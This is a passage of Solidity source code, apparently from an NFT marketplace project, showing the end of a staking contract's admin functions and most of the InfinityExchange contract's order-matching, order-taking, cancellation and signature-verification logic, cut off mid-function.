StakeLevel.PLATINUM) {\n      PLATINUM_STAKE_THRESHOLD = threshold;\n    }\n  }\n\n  /// @dev Admin function to update rageQuit penalties\n  function updatePenalties(\n    uint16 threeMonthPenalty,\n    uint16 sixMonthPenalty,\n    uint16 twelveMonthPenalty\n  ) external onlyOwner {\n    THREE_MONTH_PENALTY = threeMonthPenalty;\n    SIX_MONTH_PENALTY = sixMonthPenalty;\n    TWELVE_MONTH_PENALTY = twelveMonthPenalty;\n  }\n\n  /// @dev Admin function to update Infinity treasury\n  function updateInfinityTreasury(address _infinityTreasury) external onlyOwner {\n    INFINITY_TREASURY = _infinityTreasury;\n  }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\n\n// external imports\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\nimport {ReentrancyGuard} from '@openzeppelin/contracts/security/ReentrancyGuard.sol';\nimport {IERC165} from '@openzeppelin/contracts/interfaces/IERC165.sol';\nimport {IERC721} from '@openzeppelin/contracts/token/ERC721/IERC721.sol';\nimport {IERC1155} from '@openzeppelin/contracts/token/ERC1155/IERC1155.sol';\nimport {IERC20, SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\nimport {EnumerableSet} from '@openzeppelin/contracts/utils/structs/EnumerableSet.sol';\n\n// internal imports\nimport {OrderTypes} from '../libs/OrderTypes.sol';\nimport {IComplication} from '../interfaces/IComplication.sol';\nimport {SignatureChecker} from '../libs/SignatureChecker.sol';\n\n/**\n@title InfinityExchange\n@author nneverlander. Twitter @nneverlander\n@notice The main NFT exchange contract that holds state and does asset transfers\n@dev This contract can be extended via 'complications' - strategies that let the exchange execute various types of orders\n      like dutch auctions, reverse dutch auctions, floor price orders, private sales, etc.\n\nNFTNFTNFT...........................................NFTNFTNFT\nNFTNFT                                                 NFTNFT\nNFT                                                       NFT\n.                                                           .\n.                                                           .\n.                                                           .\n.                                                           .\n.               NFTNFTNFT            NFTNFTNFT              .\n.            NFTNFTNFTNFTNFT      NFTNFTNFTNFTNFT           .\n.           NFTNFTNFTNFTNFTNFT   NFTNFTNFTNFTNFTNFT         .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.          NFTNFTNFTNFTNFTNFTN   NFTNFTNFTNFTNFTNFT         .\n.            NFTNFTNFTNFTNFT      NFTNFTNFTNFTNFT           .\n.               NFTNFTNFT            NFTNFTNFT              .\n.                                                           .\n.                                                           .\n.                                                           .\n.                                                           .\nNFT                                                       NFT\nNFTNFT                                                 NFTNFT\nNFTNFTNFT...........................................NFTNFTNFT \n\n*/\ncontract InfinityExchange is ReentrancyGuard, Ownable {\n  using SafeERC20 for IERC20;\n  using EnumerableSet for EnumerableSet.AddressSet;\n\n  /// @dev WETH address of a chain; set at deploy time to the WETH address of the chain that this contract is deployed to\n  address public immutable WETH;\n  /// @dev Used in order signing with EIP-712\n  bytes32 public immutable DOMAIN_SEPARATOR;\n  /// @dev This is the adress that is used to send auto sniped orders for execution on chain\n  address public MATCH_EXECUTOR;\n  /// @dev Gas cost for auto sniped orders are paid by the buyers and refunded to this contract in the form of WETH\n  uint32 public WETH_TRANSFER_GAS_UNITS = 50000;\n  /// @notice Exchange fee in basis points (250 bps = 2.5%)\n  uint16 public PROTOCOL_FEE_BPS = 250;\n\n  /**\n   @dev All orders should have a nonce >= to this value. \n        Any orders with nonce value less than this are non-executable. \n        Used for cancelling all outstanding orders.\n  */\n  mapping(address => uint256) public userMinOrderNonce;\n\n  /// @dev This records already executed or cancelled orders to prevent replay attacks.\n  mapping(address => mapping(uint256 => bool)) public isUserOrderNonceExecutedOrCancelled;\n\n  /// @dev Storage variable that keeps track of valid complications (order execution strategies)\n  EnumerableSet.AddressSet private _complications;\n  /// @dev Storate variable that keeps track of valid currencies (tokens)\n  EnumerableSet.AddressSet private _currencies;\n\n  event CancelAllOrders(address user, uint256 newMinNonce);\n  event CancelMultipleOrders(address user, uint256[] orderNonces);\n  event NewWethTransferGasUnits(uint32 wethTransferGasUnits);\n  event NewProtocolFee(uint16 protocolFee);\n\n  event MatchOrderFulfilled(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    address seller,\n    address buyer,\n    address complication, // address of the complication that defines the execution\n    address currency, // token address of the transacting currency\n    uint256 amount // amount spent on the order\n  );\n\n  event TakeOrderFulfilled(\n    bytes32 orderHash,\n    address seller,\n    address buyer,\n    address complication, // address of the complication that defines the execution\n    address currency, // token address of the transacting currency\n    uint256 amount // amount spent on the order\n  );\n\n  constructor(address _WETH, address _matchExecutor) {\n    // Calculate the domain separator\n    DOMAIN_SEPARATOR = keccak256(\n      abi.encode(\n        keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),\n        keccak256('InfinityExchange'),\n        keccak256(bytes('1')), // for versionId = 1\n        block.chainid,\n        address(this)\n      )\n    );\n    WETH = _WETH;\n    MATCH_EXECUTOR = _matchExecutor;\n  }\n\n  fallback() external payable {}\n\n  receive() external payable {}\n\n  // =================================================== USER FUNCTIONS =======================================================\n\n  /**\n   @notice Matches orders one to one where each order has 1 NFT. Example: Match 1 specific NFT buy with one specific NFT sell.\n   @dev Can execute orders in batches for gas efficiency. Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n   @param makerOrders1 Maker order 1\n   @param makerOrders2 Maker order 2\n  */\n  function matchOneToOneOrders(\n    OrderTypes.MakerOrder[] calldata makerOrders1,\n    OrderTypes.MakerOrder[] calldata makerOrders2\n  ) external {\n    uint256 startGas = gasleft();\n    uint256 numMakerOrders = makerOrders1.length;\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(numMakerOrders == makerOrders2.length, 'mismatched lengths');\n\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n    address weth = WETH;\n    for (uint256 i = 0; i < numMakerOrders; ) {\n      uint256 startGasPerOrder = gasleft() + ((startGas - gasleft()) / numMakerOrders);\n      require(_complications.contains(makerOrders1[i].execParams[0]), 'invalid complication');\n      (bool canExec, uint256 execPrice) = IComplication(makerOrders1[i].execParams[0]).canExecMatchOneToOne(\n        makerOrders1[i],\n        makerOrders2[i]\n      );\n      require(canExec, 'cannot execute');\n      _matchOneToOneOrders(\n        makerOrders1[i],\n        makerOrders2[i],\n        startGasPerOrder,\n        execPrice,\n        protocolFeeBps,\n        wethTransferGasUnits,\n        weth\n      );\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   @notice Matches one  order to many orders. Example: A buy order with 5 specific NFTs with 5 sell orders with those specific NFTs.\n   @dev Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n   @param makerOrder The one order to match\n   @param manyMakerOrders Array of multiple orders to match the one order against\n  */\n  function matchOneToManyOrders(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external {\n    uint256 startGas = gasleft();\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(_complications.contains(makerOrder.execParams[0]), 'invalid complication');\n    require(\n      IComplication(makerOrder.execParams[0]).canExecMatchOneToMany(makerOrder, manyMakerOrders),\n      'cannot execute'\n    );\n    bytes32 makerOrderHash = _hash(makerOrder);\n    require(isOrderValid(makerOrder, makerOrderHash), 'invalid maker order');\n    uint256 ordersLength = manyMakerOrders.length;\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n    address weth = WETH;\n    if (makerOrder.isSellOrder) {\n      for (uint256 i = 0; i < ordersLength; ) {\n        // 20000 for the SSTORE op that updates maker nonce status from zero to a non zero status\n        uint256 startGasPerOrder = gasleft() + ((startGas + 20000 - gasleft()) / ordersLength);\n        _matchOneMakerSellToManyMakerBuys(\n          makerOrderHash,\n          makerOrder,\n          manyMakerOrders[i],\n          startGasPerOrder,\n          protocolFeeBps,\n          wethTransferGasUnits,\n          weth\n        );\n        unchecked {\n          ++i;\n        }\n      }\n      isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n    } else {\n      uint256 protocolFee;\n      for (uint256 i = 0; i < ordersLength; ) {\n        protocolFee += _matchOneMakerBuyToManyMakerSells(\n          makerOrderHash,\n          manyMakerOrders[i],\n          makerOrder,\n          protocolFeeBps\n        );\n        unchecked {\n          ++i;\n        }\n      }\n      isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n      uint256 gasCost = (startGas - gasleft() + WETH_TRANSFER_GAS_UNITS) * tx.gasprice;\n      // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n      // else we need to send the protocol fee separately in the execution currency\n      // since the buyer is common across many sell orders, this part can be executed outside the above for loop\n      // in contrast to the case where if the one order is a sell order, we need to do this in each for loop\n      if (makerOrder.execParams[1] == weth) {\n        IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), protocolFee + gasCost);\n      } else {\n        IERC20(makerOrder.execParams[1]).safeTransferFrom(makerOrder.signer, address(this), protocolFee);\n        IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), gasCost);\n      }\n    }\n  }\n\n  /**\n   @notice Matches orders one to one where no specific NFTs are specified. \n          Example: A collection wide buy order with any 2 NFTs with a sell order that has any 2 NFTs from that collection.\n   @dev Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n        The constructs param specifies the actual NFTs that will be executed since buys and sells need not specify actual NFTs - only \n        a higher level intent.\n   @param sells User signed sell orders\n   @param buys User signed buy orders\n   @param constructs Intersection of the NFTs in the sells and buys. Constructed by an off chain matching engine.\n  */\n  function matchOrders(\n    OrderTypes.MakerOrder[] calldata sells,\n    OrderTypes.MakerOrder[] calldata buys,\n    OrderTypes.OrderItem[][] calldata constructs\n  ) external {\n    uint256 startGas = gasleft();\n    uint256 numSells = sells.length;\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(numSells == buys.length && numSells == constructs.length, 'mismatched lengths');\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n    address weth = WETH;\n    for (uint256 i = 0; i < numSells; ) {\n      uint256 startGasPerOrder = gasleft() + ((startGas - gasleft()) / numSells);\n      (bool executionValid, uint256 execPrice) = IComplication(sells[i].execParams[0]).canExecMatchOrder(\n        sells[i],\n        buys[i],\n        constructs[i]\n      );\n      require(executionValid, 'cannot execute');\n      _matchOrders(\n        sells[i],\n        buys[i],\n        constructs[i],\n        startGasPerOrder,\n        execPrice,\n        protocolFeeBps,\n        wethTransferGasUnits,\n        weth\n      );\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   @notice Batch buys or sells orders with specific `1` NFTs. Transaction initiated by an end user.\n   @param makerOrders The orders to fulfill\n  */\n  function takeMultipleOneOrders(OrderTypes.MakerOrder[] calldata makerOrders) external payable nonReentrant {\n    uint256 numMakerOrders = makerOrders.length;\n    uint256 totalPrice;\n    address currency = makerOrders[0].execParams[1];\n    bool isMakerSeller = makerOrders[0].isSellOrder;\n    if (!isMakerSeller) {\n      require(currency != address(0), 'offers only in ERC20');\n    }\n    for (uint256 i = 0; i < numMakerOrders; ) {\n      bytes32 makerOrderHash = _hash(makerOrders[i]);\n      require(isOrderValid(makerOrders[i], makerOrderHash), 'invalid maker order');\n      bool isTimeValid = makerOrders[i].constraints[3] <= block.timestamp &&\n        makerOrders[i].constraints[4] >= block.timestamp;\n      require(isTimeValid, 'invalid time');\n      require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');\n      require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');\n      uint256 execPrice = _getCurrentPrice(makerOrders[i]);\n      totalPrice += execPrice;\n      _execTakeOneOrder(makerOrderHash, makerOrders[i], isMakerSeller, execPrice);\n      unchecked {\n        ++i;\n      }\n    }\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n  }\n\n  /**\n   @notice Batch buys or sells orders where maker orders can have unspecified NFTs. Transaction initiated by an end user.\n   @param makerOrders The orders to fulfill\n   @param takerNfts The specific NFTs that the taker is willing to take that intersect with the higher order intent of the maker\n   Example: If a makerOrder is 'buy any one of these 2 specific NFTs', then the takerNfts would be 'this one specific NFT'.\n  */\n  function takeOrders(OrderTypes.MakerOrder[] calldata makerOrders, OrderTypes.OrderItem[][] calldata takerNfts)\n    external\n    payable\n    nonReentrant\n  {\n    uint256 ordersLength = makerOrders.length;\n    require(ordersLength == takerNfts.length, 'mismatched lengths');\n    uint256 totalPrice;\n    address currency = makerOrders[0].execParams[1];\n    bool isMakerSeller = makerOrders[0].isSellOrder;\n    if (!isMakerSeller) {\n      require(currency != address(0), 'offers only in ERC20');\n    }\n    for (uint256 i = 0; i < ordersLength; ) {\n      require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');\n      require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');\n      uint256 execPrice = _getCurrentPrice(makerOrders[i]);\n      totalPrice += execPrice;\n      _takeOrders(makerOrders[i], takerNfts[i], execPrice);\n      unchecked {\n        ++i;\n      }\n    }\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n  }\n\n  /**\n   @notice Helper function (non exchange related) to send multiple NFTs in one go\n   @param to The orders to fulfill\n   @param items The specific NFTs to transfer\n  */\n  function transferMultipleNFTs(address to, OrderTypes.OrderItem[] calldata items) external nonReentrant {\n    _transferMultipleNFTs(msg.sender, to, items);\n  }\n\n  /**\n   * @notice Cancel all pending orders\n   * @param minNonce minimum user nonce\n   */\n  function cancelAllOrders(uint256 minNonce) external {\n    require(minNonce > userMinOrderNonce[msg.sender], 'nonce too low');\n    require(minNonce < userMinOrderNonce[msg.sender] + 1000000, 'too many');\n    userMinOrderNonce[msg.sender] = minNonce;\n    emit CancelAllOrders(msg.sender, minNonce);\n  }\n\n  /**\n   * @notice Cancel multiple orders\n   * @param orderNonces array of order nonces\n   */\n  function cancelMultipleOrders(uint256[] calldata orderNonces) external {\n    uint256 numNonces = orderNonces.length;\n    require(numNonces > 0, 'cannot be empty');\n    for (uint256 i = 0; i < numNonces; ) {\n      require(orderNonces[i] >= userMinOrderNonce[msg.sender], 'nonce too low');\n      require(!isUserOrderNonceExecutedOrCancelled[msg.sender][orderNonces[i]], 'nonce already executed or cancelled');\n      isUserOrderNonceExecutedOrCancelled[msg.sender][orderNonces[i]] = true;\n      unchecked {\n        ++i;\n      }\n    }\n    emit CancelMultipleOrders(msg.sender, orderNonces);\n  }\n\n  // ====================================================== VIEW FUNCTIONS ======================================================\n\n  /**\n   * @notice Check whether user order nonce is executed or cancelled\n   * @param user address of user\n   * @param nonce nonce of the order\n   * @return whether nonce is valid\n   */\n  function isNonceValid(address user, uint256 nonce) external view returns (bool) {\n    return !isUserOrderNonceExecutedOrCancelled[user][nonce] && nonce > userMinOrderNonce[user];\n  }\n\n  /**\n   * @notice Check whether a user signed order has valid signature\n   * @param order the order to verify\n   * @return whether order has valid signature\n   */\n  function verifyOrderSig(OrderTypes.MakerOrder calldata order) external view returns (bool) {\n    // Verify the validity of the signature\n    (bytes32 r, bytes32 s, uint8 v) = abi.decode(order.sig, (bytes32, bytes32, uint8));\n    return SignatureChecker.verify(_hash(order), order.signer, r, s, v, DOMAIN_SEPARATOR);\n  }\n\n  /**\n   * @notice Checks whether orders are valid\n   * @dev Checks whether currencies match, sides match, complications match and if each order is valid (see isOrderValid)\n   * @param sellOrderHash hash of the sell order\n   * @param buyOrderHash hash of the buy order\n   * @param sell the sell order\n   * @param buy the buy order\n   * @return whether orders are valid\n   */\n  function verifyMatchOneToOneOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy\n  ) public view returns (bool) {\n    bool currenciesMatch = sell.execParams[1] == buy.execParams[1] ||\n      (sell.execParams[1] == address(0) && buy.execParams[1] == WETH);\n    return (sell.isSellOrder &&\n      !buy.isSellOrder &&\n      sell.execParams[0] == buy.execParams[0] &&\n      currenciesMatch &&\n      isOrderValid(sell, sellOrderHash) &&\n      isOrderValid(buy, buyOrderHash));\n  }\n\n  /**\n   * @notice Checks whether orders are valid\n   * @dev Checks whether currencies match, sides match, complications match and if each order is valid (see isOrderValid)\n   * @param orderHash hash of the order\n   * @param sell the sell order\n   * @param buy the buy order\n   * @return whether orders are valid\n   */\n  function verifyMatchOneToManyOrders(\n    bytes32 orderHash,\n    bool verifySellOrder,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy\n  ) public view returns (bool) {\n    bool currenciesMatch = sell.execParams[1] == buy.execParams[1] ||\n      (sell.execParams[1] == address(0) && buy.execParams[1] == WETH);\n    bool _orderValid;\n    if (verifySellOrder) {\n      _orderValid = isOrderValid(sell, orderHash);\n    } else {\n      _orderValid = isOrderValid(buy, orderHash);\n    }\n    return (sell.isSellOrder &&\n      !buy.isSellOrder &&\n      sell.execParams[0] == buy.execParams[0] &&\n      currenciesMatch &&\n      _orderValid);\n  }\n\n  /**\n   * @notice Checks whether orders are valid\n   * @dev Checks whether currencies match, sides match, complications match and if each order is valid (see isOrderValid)\n          Also checks if the given complication can execute this order\n   * @param sellOrderHash hash of the sell order\n   * @param buyOrderHash hash of the buy order\n   * @param sell the sell order\n   * @param buy the buy order\n   * @return whether orders are valid and the execution price\n   */\n  function verifyMatchOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy\n  ) public view returns (bool) {\n    bool currenciesMatch = sell.execParams[1] == buy.execParams[1] ||\n      (sell.execParams[1] == address(0) && buy.execParams[1] == WETH);\n    return (sell.isSellOrder &&\n      !buy.isSellOrder &&\n      sell.execParams[0] == buy.execParams[0] &&\n      currenciesMatch &&\n      isOrderValid(sell, sellOrderHash) &&\n      isOrderValid(buy, buyOrderHash));\n  }\n\n  /**\n   * @notice Verifies the validity of the order\n   * @dev checks whether order nonce was cancelled or already executed, \n          if signature is valid and if the complication and currency are valid\n   * @param order the order\n   * @param orderHash computed hash of the order\n   */\n  function isOrderValid(OrderTypes.MakerOrder calldata order, bytes32 orderHash) public view returns (bool) {\n    bool orderExpired = isUserOrderNonceExecutedOrCancelled[order.signer][order.constraints[5]] ||\n      order.constraints[5] < userMinOrderNonce[order.signer];\n    // Verify the validity of the signature\n    (bytes32 r, bytes32 s, uint8 v) = abi.decode(order.sig, (bytes32, bytes32, uint8));\n    bool sigValid = SignatureChecker.verify(orderHash, order.signer, r, s, v, DOMAIN_SEPARATOR);\n    if (\n      orderExpired ||\n      !sigValid ||\n      order.signer == address(0) ||\n      !_complications.contains(order.execParams[0]) ||\n      !_currencies.contains(order.execParams[1])\n    ) {\n      return false;\n    }\n    return true;\n  }\n\n  /// @notice returns the number of complications supported by the exchange\n  function numComplications() external view returns (uint256) {\n    return _complications.length();\n  }\n\n  /// @notice returns the complication at the given index\n  function getComplicationAt(uint256 index) external view returns (address) {\n    return _complications.at(index);\n  }\n\n  /// @notice returns whether a given complication is valid\n  function isValidComplication(address complication) external view returns (bool) {\n    return _complications.contains(complication);\n  }\n\n  /// @notice returns the number of currencies supported by the exchange\n  function numCurrencies() external view returns (uint256) {\n    return _currencies.length();\n  }\n\n  /// @notice returns the currency at the given index\n  function getCurrencyAt(uint256 index) external view returns (address) {\n    return _currencies.at(index);\n  }\n\n  /// @notice returns whether a given currency is valid\n  function isValidCurrency(address currency) external view returns (bool) {\n    return _currencies.contains(currency);\n  }\n\n  // ====================================================== INTERNAL FUNCTIONS ================================================\n\n  /**\n   * @notice Internal helper function to match orders one to one\n   * @param makerOrder1 first order\n   * @param makerOrder2 second maker order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _matchOneToOneOrders(\n    OrderTypes.MakerOrder calldata makerOrder1,\n    OrderTypes.MakerOrder calldata makerOrder2,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    OrderTypes.MakerOrder calldata sell = makerOrder1.isSellOrder ? makerOrder1 : makerOrder2;\n    OrderTypes.MakerOrder calldata buy = makerOrder1.isSellOrder ? makerOrder2 : makerOrder1;\n    bytes32 sellOrderHash = _hash(sell);\n    bytes32 buyOrderHash = _hash(buy);\n    require(verifyMatchOneToOneOrders(sellOrderHash, buyOrderHash, sell, buy), 'order not verified');\n    _execMatchOneToOneOrders(\n      sellOrderHash,\n      buyOrderHash,\n      sell,\n      buy,\n      startGasPerOrder,\n      execPrice,\n      protocolFeeBps,\n      wethTransferGasUnits,\n      weth\n    );\n  }\n\n  /**\n   * @notice Internal helper function to match one maker sell order to many maker buys\n   * @param sellOrderHash sell order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _matchOneMakerSellToManyMakerBuys(\n    bytes32 sellOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    bytes32 buyOrderHash = _hash(buy);\n    require(verifyMatchOneToManyOrders(buyOrderHash, false, sell, buy), 'order not verified');\n    _execMatchOneMakerSellToManyMakerBuys(\n      sellOrderHash,\n      buyOrderHash,\n      sell,\n      buy,\n      startGasPerOrder,\n      _getCurrentPrice(buy),\n      protocolFeeBps,\n      wethTransferGasUnits,\n      weth\n    );\n  }\n\n  /**\n   * @notice Internal helper function to match one maker buy order to many maker sells\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param protocolFeeBps exchange fee\n   */\n  function _matchOneMakerBuyToManyMakerSells(\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint16 protocolFeeBps\n  ) internal returns (uint256) {\n    bytes32 sellOrderHash = _hash(sell);\n    require(verifyMatchOneToManyOrders(sellOrderHash, true, sell, buy), 'order not verified');\n    return\n      _execMatchOneMakerBuyToManyMakerSells(\n        sellOrderHash,\n        buyOrderHash,\n        sell,\n        buy,\n        _getCurrentPrice(sell),\n        protocolFeeBps\n      );\n  }\n\n  /**\n   * @notice Internal helper function to match orders specified via a higher order intent\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param constructedNfts the nfts constructed by an off chain matching that are guaranteed to intersect\n            with the user specified signed intents (orders)\n   * @param startGasPerOrder start gas when this order started execution\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _matchOrders(\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    bytes32 sellOrderHash = _hash(sell);\n    bytes32 buyOrderHash = _hash(buy);\n    require(verifyMatchOrders(sellOrderHash, buyOrderHash, sell, buy), 'order not verified');\n    _execMatchOrders(\n      sellOrderHash,\n      buyOrderHash,\n      sell,\n      buy,\n      constructedNfts,\n      startGasPerOrder,\n      execPrice,\n      protocolFeeBps,\n      wethTransferGasUnits,\n      weth\n    );\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match one to one orders\n   * @dev Updates order nonce states, does asset transfers and emits events. Also refunds gas expenditure to the contract\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _execMatchOneToOneOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[sell.signer][sell.constraints[5]] = true;\n    isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _transferMultipleNFTs(sell.signer, buy.signer, sell.nfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, sell.signer, remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n    // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n    // else we need to send the protocol fee separately in the execution currency\n    if (buy.execParams[1] == weth) {\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n    } else {\n      IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n    }\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match one sell to many buy orders\n   * @dev Updates order nonce states, does asset transfers and emits events. Also refunds gas expenditure to the contract\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _execMatchOneMakerSellToManyMakerBuys(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOneToManyOrders(sell.signer, buy.signer, buy.nfts, buy.execParams[1], remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n    // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n    // else we need to send the protocol fee separately in the execution currency\n    if (buy.execParams[1] == weth) {\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n    } else {\n      IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n    }\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match one buy to many sell orders\n   * @dev Updates order nonce states, does asset transfers and emits events. Gas expenditure refund is done in the caller\n          since it does not need to be done in a loop\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @return the protocolFee so that the buyer can pay the protocol fee and gas cost in one go\n   */\n  function _execMatchOneMakerBuyToManyMakerSells(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 execPrice,\n    uint16 protocolFeeBps\n  ) internal returns (uint256) {\n    